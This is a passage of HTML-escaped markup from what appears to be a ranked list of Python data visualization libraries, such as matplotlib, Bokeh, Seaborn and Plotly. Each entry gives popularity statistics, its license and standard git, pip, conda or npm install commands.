href=&#34;https://pypi.org/project/matplotlib&#34;&gt;PyPi&lt;/a&gt; (📥 29M / month · 📦 55K · ⏱️ 03.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install matplotlib&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/matplotlib&#34;&gt;Conda&lt;/a&gt; (📥 12M · ⏱️ 04.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge matplotlib&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/bokeh/bokeh&#34;&gt;Bokeh&lt;/a&gt;&lt;/b&gt; (🥇43 · ⭐ 16K · 📉) - Interactive Data Visualization in the browser, from Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/bokeh/bokeh&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 600 · 🔀 3.9K · 📦 52K · 📋 6.9K - 10% open · ⏱️ 19.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/bokeh/bokeh&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/bokeh&#34;&gt;PyPi&lt;/a&gt; (📥 2.5M / month · 📦 3.5K · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install bokeh&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/bokeh&#34;&gt;Conda&lt;/a&gt; (📥 7.3M · ⏱️ 19.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge bokeh&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/mwaskom/seaborn&#34;&gt;Seaborn&lt;/a&gt;&lt;/b&gt; (🥇43 · ⭐ 9.5K) - Statistical data visualization in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/mwaskom/seaborn&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 170 · 🔀 1.6K · 📥 220 · 📦 160K · 📋 2K - 5% open · ⏱️ 23.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/mwaskom/seaborn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/seaborn&#34;&gt;PyPi&lt;/a&gt; (📥 9.5M / month · 📦 8.8K · ⏱️ 16.08.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install seaborn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/seaborn&#34;&gt;Conda&lt;/a&gt; (📥 3.8M · ⏱️ 16.08.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge seaborn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/plotly/plotly.py&#34;&gt;Plotly&lt;/a&gt;&lt;/b&gt; (🥇42 · ⭐ 12K) - The interactive graphing library for Python (includes Plotly Express). &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/plotly/plotly.py&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 200 · 🔀 2.1K · 📦 10 · 📋 2.4K - 49% open · ⏱️ 11.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/plotly/plotly.py&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/plotly&#34;&gt;PyPi&lt;/a&gt; (📥 7.7M / month · 📦 4K · ⏱️ 11.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install plotly&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/plotly&#34;&gt;Conda&lt;/a&gt; (📥 2.6M · ⏱️ 11.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge plotly&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://www.npmjs.com/package/plotlywidget&#34;&gt;npm&lt;/a&gt; (📥 45K / month · 📦 4 · ⏱️ 12.01.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; npm install plotlywidget&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/plotly/dash&#34;&gt;dash&lt;/a&gt;&lt;/b&gt; (🥇39 · ⭐ 17K) - Analytical Web Apps for Python, R, Julia, and Jupyter. No JavaScript Required. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/plotly/dash&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 120 · 🔀 1.7K · 📦 190 · 📋 1.3K - 47% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/plotly/dash&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/dash&#34;&gt;PyPi&lt;/a&gt; (📥 870K / month · 📦 1.2K · ⏱️ 11.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install dash&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/dash&#34;&gt;Conda&lt;/a&gt; (📥 460K · ⏱️ 12.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge dash&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/altair-viz/altair&#34;&gt;Altair&lt;/a&gt;&lt;/b&gt; (🥇39 · ⭐ 7.5K) - Declarative statistical visualization library for Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/altair-viz/altair&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 140 · 🔀 660 · 📦 27K · 📋 1.6K - 14% open · ⏱️ 25.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/altair-viz/altair&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/altair&#34;&gt;PyPi&lt;/a&gt; (📥 8.3M / month · 📦 340 · ⏱️ 29.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install altair&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/altair&#34;&gt;Conda&lt;/a&gt; (📥 1.2M · ⏱️ 29.12.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge altair&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/ydataai/pandas-profiling&#34;&gt;pandas-profiling&lt;/a&gt;&lt;/b&gt; (🥈38 · ⭐ 9K) - Create HTML profiling reports from pandas DataFrame.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1S&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/ydataai/pandas-profiling&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 88 · 🔀 1.3K · 📦 7.9K · 📋 570 - 19% open · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/ydataai/pandas-profiling&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pandas-profiling&#34;&gt;PyPi&lt;/a&gt; (📥 1.1M / month · 📦 160 · ⏱️ 27.09.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pandas-profiling&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pandas-profiling&#34;&gt;Conda&lt;/a&gt; (📥 210K · ⏱️ 02.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pandas-profiling&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/xflr6/graphviz&#34;&gt;Graphviz&lt;/a&gt;&lt;/b&gt; (🥈35 · ⭐ 1.2K) - Simple Python interface for Graphviz. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/xflr6/graphviz&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 18 · 🔀 180 · 📦 31K · 📋 140 - 4% open · ⏱️ 17.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/xflr6/graphviz&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/graphviz&#34;&gt;PyPi&lt;/a&gt; (📥 11M / month · 📦 3K · ⏱️ 16.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install graphviz&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/anaconda/python-graphviz&#34;&gt;Conda&lt;/a&gt; (📥 20K · ⏱️ 04.02.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c anaconda python-graphviz&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pyecharts/pyecharts&#34;&gt;pyecharts&lt;/a&gt;&lt;/b&gt; (🥈34 · ⭐ 12K) - Python Echarts Plotting Library. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/pyecharts/pyecharts&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 30 · 🔀 2.7K · 📦 2.3K · 📋 1.6K - 0% open · ⏱️ 25.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pyecharts/pyecharts&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pyecharts&#34;&gt;PyPi&lt;/a&gt; (📥 89K / month · 📦 220 · ⏱️ 16.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pyecharts&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/lmcinnes/umap&#34;&gt;UMAP&lt;/a&gt;&lt;/b&gt; (🥈34 · ⭐ 5.6K) - Uniform Manifold Approximation and Projection. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/lmcinnes/umap&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 100 · 🔀 640 · 📦 5.3K · 📋 620 - 53% open · ⏱️ 06.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/lmcinnes/umap&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/umap-learn&#34;&gt;PyPi&lt;/a&gt; (📥 740K / month · 📦 320 · ⏱️ 13.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install umap-learn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/umap-learn&#34;&gt;Conda&lt;/a&gt; (📥 1.1M · ⏱️ 14.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge umap-learn&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pyqtgraph/pyqtgraph&#34;&gt;PyQtGraph&lt;/a&gt;&lt;/b&gt; (🥈34 · ⭐ 2.8K) - Fast data visualization and GUI tools for scientific / engineering.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/pyqtgraph/pyqtgraph&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 220 · 🔀 920 · 📋 1K - 31% open · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pyqtgraph/pyqtgraph&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pyqtgraph&#34;&gt;PyPi&lt;/a&gt; (📥 91K / month · 📦 790 · ⏱️ 04.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pyqtgraph&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pyqtgraph&#34;&gt;Conda&lt;/a&gt; (📥 250K · ⏱️ 05.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pyqtgraph&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/holoviz/holoviews&#34;&gt;HoloViews&lt;/a&gt;&lt;/b&gt; (🥈34 · ⭐ 2.2K) - With Holoviews, your data visualizes itself. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/holoviz/holoviews&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 120 · 🔀 360 · 📋 2.8K - 31% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/holoviz/holoviews&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/holoviews&#34;&gt;PyPi&lt;/a&gt; (📥 340K / month · 📦 210 · ⏱️ 06.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install holoviews&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/holoviews&#34;&gt;Conda&lt;/a&gt; (📥 720K · ⏱️ 09.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge holoviews&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://www.npmjs.com/package/@pyviz/jupyterlab_pyviz&#34;&gt;npm&lt;/a&gt; (📥 1.7K / month · ⏱️ 24.05.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; npm install @pyviz/jupyterlab_pyviz&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/pyvista/pyvista&#34;&gt;PyVista&lt;/a&gt;&lt;/b&gt; (🥈34 · ⭐ 1.3K) - 3D plotting and mesh analysis through a streamlined interface for.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/pyvista/pyvista&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 91 · 🔀 250 · 📥 650 · 📦 760 · 📋 810 - 30% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/pyvista/pyvista&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/pyvista&#34;&gt;PyPi&lt;/a&gt; (📥 75K / month · 📦 100 · ⏱️ 18.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install pyvista&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/pyvista&#34;&gt;Conda&lt;/a&gt; (📥 170K · ⏱️ 15.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge pyvista&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/voxel51/fiftyone&#34;&gt;FiftyOne&lt;/a&gt;&lt;/b&gt; (🥈33 · ⭐ 1.3K) - Visualize, create, and debug image and video datasets.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1A&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1Q&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/voxel51/fiftyone&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 38 · 🔀 170 · 📦 110 · 📋 780 - 32% open · ⏱️ 25.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/voxel51/fiftyone&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/fiftyone&#34;&gt;PyPi&lt;/a&gt; (📥 18K / month · 📦 1 · ⏱️ 24.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install fiftyone&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/amueller/word_cloud&#34;&gt;wordcloud&lt;/a&gt;&lt;/b&gt; (🥈32 · ⭐ 8.8K) - A little word cloud generator in Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/amueller/word_cloud&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 65 · 🔀 2.2K · 📋 480 - 23% open · ⏱️ 26.04.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/amueller/word_cloud&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/wordcloud&#34;&gt;PyPi&lt;/a&gt; (📥 740K / month · 📦 710 · ⏱️ 11.11.2020):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install wordcloud&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/wordcloud&#34;&gt;Conda&lt;/a&gt; (📥 280K · ⏱️ 15.11.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge wordcloud&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/finos/perspective&#34;&gt;Perspective&lt;/a&gt;&lt;/b&gt; (🥈32 · ⭐ 4.5K) - A data visualization and analytics component, especially.. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3nYMfla&#34;&gt;Apache-2&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/finos/perspective&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 69 · 🔀 470 · 📦 250 · 📋 520 - 16% open · ⏱️ 26.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/finos/perspective&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/perspective-python&#34;&gt;PyPi&lt;/a&gt; (📥 3K / month · 📦 9 · ⏱️ 14.03.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install perspective-python&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/perspective&#34;&gt;Conda&lt;/a&gt; (📥 64K · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge perspective&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://www.npmjs.com/package/@finos/perspective-jupyterlab&#34;&gt;npm&lt;/a&gt; (📥 2.7K / month · ⏱️ 13.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; npm install @finos/perspective-jupyterlab&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/has2k1/plotnine&#34;&gt;plotnine&lt;/a&gt;&lt;/b&gt; (🥈32 · ⭐ 3.1K) - A grammar of graphics for Python. &lt;code&gt;&lt;a href=&#34;http://bit.ly/34MBwT8&#34;&gt;MIT&lt;/a&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/has2k1/plotnine&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 95 · 🔀 170 · 📋 490 - 12% open · ⏱️ 20.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/has2k1/plotnine&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/plotnine&#34;&gt;PyPi&lt;/a&gt; (📥 250K / month · 📦 200 · ⏱️ 25.03.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; pip install plotnine&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://anaconda.org/conda-forge/plotnine&#34;&gt;Conda&lt;/a&gt; (📥 170K · ⏱️ 25.03.2021):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; conda install -c conda-forge plotnine&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA; &lt;/ul&gt; &#xA;&lt;/details&gt; &#xA;&lt;details&gt;&#xA; &lt;summary&gt;&lt;b&gt;&lt;a href=&#34;https://github.com/vispy/vispy&#34;&gt;VisPy&lt;/a&gt;&lt;/b&gt; (🥈32 · ⭐ 2.9K) - High-performance interactive 2D/3D data visualization library. &lt;code&gt;&lt;a href=&#34;http://bit.ly/3aKzpTv&#34;&gt;BSD-3&lt;/a&gt;&lt;/code&gt; &lt;code&gt;&lt;img src=&#34;https://git.io/JLy1E&#34; style=&#34;display:inline;&#34; width=&#34;13&#34; height=&#34;13&#34;&gt;&lt;/code&gt;&lt;/summary&gt; &#xA; &lt;ul&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://github.com/vispy/vispy&#34;&gt;GitHub&lt;/a&gt; (👨‍💻 170 · 🔀 590 · 📦 750 · 📋 1.3K - 21% open · ⏱️ 18.05.2022):&lt;/p&gt; &lt;pre&gt;&lt;code&gt; git clone https://github.com/vispy/vispy&#xA;&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; &#xA;  &lt;li&gt; &lt;p&gt;&lt;a href=&#34;https://pypi.org/project/vispy&#34;&gt;PyPi&lt;/a&gt; (📥 51K / 